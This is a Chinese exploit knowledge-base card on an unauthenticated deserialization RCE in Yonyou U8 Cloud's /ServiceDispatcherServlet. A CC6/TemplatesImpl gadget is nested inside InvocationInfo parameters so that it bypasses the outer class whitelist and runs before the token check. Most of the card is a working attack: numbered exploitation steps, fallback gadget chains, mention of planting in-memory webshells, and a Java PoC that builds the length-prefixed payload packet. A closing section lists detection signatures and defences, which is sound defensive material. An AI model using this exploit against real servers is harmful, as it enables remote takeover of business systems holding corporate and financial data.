---
id: web-java-component-yonyou-u8-servicedispatcher-invocationinfo-readexternal-cc6
title: 用友 U8 Cloud ServiceDispatcherServlet InvocationInfo.readExternal 嵌套反序列化：白名单外壳内嵌 CC6/TemplatesImpl 绕过 token 直接 RCE
type: scenario
domain: web
path: web/java/component
technique: yonyou-u8-servicedispatcher-invocationinfo-readexternal-cc6
aliases:
- 用友 U8 ServiceDispatcherServlet CC6
- InvocationInfo readExternal 反序列化
- NetObjectInputStream 白名单绕过
- CommonCollections6 TemplatesImpl 用友
- ServiceDispatcher 无 token RCE
tags:
- java
- yonyou
- u8-cloud
- deserialization
- invocationinfo
- cc6
- templatesimpl
- gadget
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
affected_versions: 2.0 2.1 2.3 2.5 2.6 2.65 2.7 3.0 3.1 3.2 3.5 3.6 5.0 5.0sp 5.1 5.1sp（2025-08-29 公告：U8cloud 所有版本 ServiceDispatcherServlet 反序列化补丁绕过实现文件上传）
verification:
  verified_by: verifier-V212
  verified_at: '2026-11-07T04:23:41+08:00'
  notes: 已对照原文与17张图核对：web.xml CommonServletDispatcher→/ServiceDispatcherServlet、NetObjectInputStream.readObject 4字节大端长度（图07/08）、token 校验与种子、InvocationInfo 构造、upm 注册、PFxxFileServiceImpl.writeDocToXMLFile 与 admin123456.jsp 落地日志均一致；与既有 token-file-write 卡（cosine 0.934）差异成立：旧卡为伪造 token 反射写文件并声明‘不能直接打 CC’，本卡为 readExternal 嵌套反序列化 CC6、token 校验前触发，属不同链；dup-scan 无本卡 pair；原文堆栈在 TemplatesImpl.newTransformer→postInitialization 因测试类 NPE 未完成命令执行，卡已标 confidence=medium 并说明，未在本机复现
---

## 一句话结论

`/ServiceDispatcherServlet` 的外层 `NetObjectInputStream` 虽然只放行 `InvocationInfo` 及其子类，但 `InvocationInfo.readExternal` 会对其 `parameters` 等字段再次调用 `ObjectInputStream.readObject`；把 CC6/TemplatesImpl gadget 塞进 `parameters` 数组，就能在外层白名单对象的“壳”内触发反序列化 RCE，且执行发生在 `verifyToken` 之前，不需要伪造 token。

## 原理

- **入口**：`web.xml` 把 `CommonServletDispatcher` 映射到 `/ServiceDispatcherServlet`，并初始化 `service=nc.bs.framework.comn.serv.ServiceDispatcher`；`doPost` 转 `doGet`，最终 `ServiceDispatcher.execCall` 调用 `NetObjectInputStream.readObject(request.getInputStream(), streamRet)`。
- **外层白名单**：`NetObjectInputStream`/`NCObjectInputStream` 在 `resolveClass` 中只允许 `InvocationInfo` 及其子类，直接发送 CommonsCollections/URLDNS 等顶层 gadget 会被拒绝，所以很多资料据此认为“只能反序列化 InvocationInfo，不能打 CC 链”。
- **嵌套反序列化**：`InvocationInfo` 实现 `Externalizable`，其 `readExternal` 会从流中逐个字段调用 `ObjectInputStream.readObject()` 读取自身字段（`parameters` 是 `Object[]`，内部可以放任意对象图）。这层嵌套的 `ObjectInputStream` 不受外层 `NetObjectInputStream` 的 `resolveClass` 白名单约束（至少未复用同一过滤逻辑），因此参数里的 gadget 会被正常反序列化并执行。
- **触发链**：原文堆栈为 `InvocationInfo.readExternal` → 嵌套 `ObjectInputStream.readObject` → `HashMap.readObject` → `TiedMapEntry.hashCode` → `LazyMap.get` → `InvokerTransformer.transform` → `TemplatesImpl.newTransformer` → `AbstractTranslet.postInitialization`，即典型的 CC6 + TemplatesImpl 字节码执行链。`HashMap.readObject` 在重建键值时会调用 key 的 `hashCode`，`TiedMapEntry.hashCode` 进入 `LazyMap.get`，`InvokerTransformer` 反射调用 `TemplatesImpl.newTransformer`，最终加载攻击者提供的 translet 字节码。
- **为什么不需要 token**：gadget 在 `readExternal` 反序列化参数时就已经执行，而 `verifyToken` 在 `execCall` 反序列化完成之后才调用；即使随后 token 校验失败、请求返回错误，命令/字节码也已经执行。原文的测试在 `newTransformer` 阶段因 `Evil` 测试类抛出 NPE，但堆栈已证明链到达 `TemplatesImpl`；换成有效的 translet 字节码即可执行任意代码（原文称可写内存马）。
- **前提**：目标 classpath 存在可用的 CommonsCollections 版本与 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`（JDK 8 常见），且 `InvocationInfo` 的 `readExternal` 确实对参数调用了嵌套 `readObject`（原文反编译与堆栈一致）。

## 触发条件

- 目标为受影响的用友 U8 Cloud 版本（2.0～5.1sp），`/ServiceDispatcherServlet` 可从攻击者网络访问。
- classpath 中存在可利用的 CommonsCollections gadget 与 TemplatesImpl；JDK/CommonsCollections 版本满足 CC6 链条件。
- 能构造 `InvocationInfo` 的序列化体并在外层加 4 字节大端长度前缀；`parameters` 中放入 CC6 payload。
- 不需要知道 tokenSeed/token，也不需要目标存在可写 Web 目录；token 校验在 gadget 执行之后。

## 利用步骤

1. 确认 `/ServiceDispatcherServlet` 可访问（POST，二进制 body，响应可能是二进制或错误页）。
2. 生成 CC6 + TemplatesImpl payload：用 ysoserial 的 CommonsCollections6（TemplatesImpl 型）或原文的 `CommonCollections().CC6_TemplatesImpl(Evil.class.getName())`，确保 TemplatesImpl 的 `_bytecodes` 是有效 translet 字节码、`_name`/`_tfactory` 等字段满足反序列化要求。
3. 构造 `InvocationInfo`：`serviceName`/`methodName` 可填任意值（如 `aaa`/`aaa`），`parameterTypes={Object.class, String.class}`，`parameters={payload, ""}`；无需设置 token/userCode。
4. 用 `NetObjectOutputStream` 序列化该 `InvocationInfo`，取序列化体长度写成 4 字节大端头，拼在序列化体前。
5. POST 到 `/ServiceDispatcherServlet`；gadget 在 `readExternal` 阶段执行，观察 DNS/HTTP/命令回连或内存马生效；响应可能因 token 校验失败而报错，不影响已执行的 payload。
6. 若目标 JDK/CC 版本不满足 CC6，换 CC1/CC5 等能在 `readObject` 阶段触发的链，或改用其他 TemplatesImpl 触发方式。

## PoC

```java
// 关键结构：白名单外壳 InvocationInfo + parameters 内嵌 CC6/TemplatesImpl
Object payload = new CommonCollections().CC6_TemplatesImpl(Evil.class.getName());

Class<?>[] paramTypes = new Class<?>[]{Object.class, String.class};
Object[] params = new Object[]{payload, ""};

InvocationInfo info = new InvocationInfo("aaa", "aaa", paramTypes, params);
// 不需要 setToken/setUserCode：gadget 在 readExternal 阶段执行

ByteArrayOutputStream bos = new ByteArrayOutputStream();
NetObjectOutputStream out = new NetObjectOutputStream(bos);
out.writeObject(info);
out.finish();
out.flush();

byte[] ser = bos.toByteArray();
byte[] packet = new byte[4 + ser.length];
packet[0] = (byte) (ser.length >>> 24);
packet[1] = (byte) (ser.length >>> 16);
packet[2] = (byte) (ser.length >>> 8);
packet[3] = (byte) ser.length;
System.arraycopy(ser, 0, packet, 4, ser.length);
// POST /ServiceDispatcherServlet，body = packet
```

说明：PoC 按原文构造方式重写；原文堆栈在 `TemplatesImpl.newTransformer` 后因测试类抛 NPE，未完成最终命令执行，故 confidence=medium。实际利用需有效 translet 字节码，并确认目标 CommonsCollections/JDK 版本。

## 变体与关联

- **CC6/TemplatesImpl**：原文使用 `CommonCollections.CC6_TemplatesImpl`；KB 的 [[web-java-deser-commonscollections-cc6-cc3-templatesimpl]] 给出 CC6 触发与 CC3 TemplatesImpl 的组合细节。
- **其他嵌套链**：只要 gadget 在 `readObject`/`hashCode`/`equals`/`toString` 阶段触发，且能放进 `parameters`，都可尝试（CC1、CC5、CC7、JDK 原生链等）；受目标依赖与 JDK 版本限制。
- **外层白名单绕过**：同类“只校验首个/根对象”的过滤器可参考 [[web-java-deserialization-filter-rootchecked-first-class-bypass]]；本卡是 `Externalizable.readExternal` 内部的二次反序列化。
- **同产品其他入口**：[[web-java-deser-yonyou-nc-usersynchronizationservlet]]（另一个用友 CC6 未认证 readObject 入口）；[[web-java-component-yonyou-u8-serviceDispatcher-invocationinfo-token-file-write]]（同入口的 token 伪造 + 文件写入链，其“不能直接打 CC”的边界仅适用于顶层 gadget，不适用于本卡的嵌套参数）。
- **边界**：`readExternal` 若改为手工按字段类型读取而非 `readObject`、或嵌套流也套用 ObjectInputFilter 时，本链不成立；无 CommonsCollections/TemplatesImpl 或 JDK 高版本模块封装限制时需换链。

## 检测与防御

- 检测：`/ServiceDispatcherServlet` 收到二进制 POST，前 4 字节大端值等于剩余 body 长度；序列化体中出现 `InvocationInfo`、`java.util.HashMap`、`TiedMapEntry`、`LazyMap`、`InvokerTransformer`、`TemplatesImpl` 等类名/特征；响应报错但主机出现异常子进程、外连或内存马。
- 检测：即使 token 校验失败，也要把该请求视为高优先级攻击尝试——gadget 可能已在反序列化阶段执行。
- 防御：升级官方补丁；用 JSON/白名单 DTO 替代 Java 原生序列化；对 `InvocationInfo` 的 `readExternal` 使用 `ObjectInputFilter` 限制嵌套类，禁止 `TemplatesImpl`/`InvokerTransformer`/`TiedMapEntry` 等；升级/移除有漏洞的 CommonsCollections；JDK 升级并开启 JEP 290 全局过滤。
- 加固：限制 `/ServiceDispatcherServlet` 仅可信来源访问；应用进程最小权限；监控子进程、出网与 WebShell 落地。
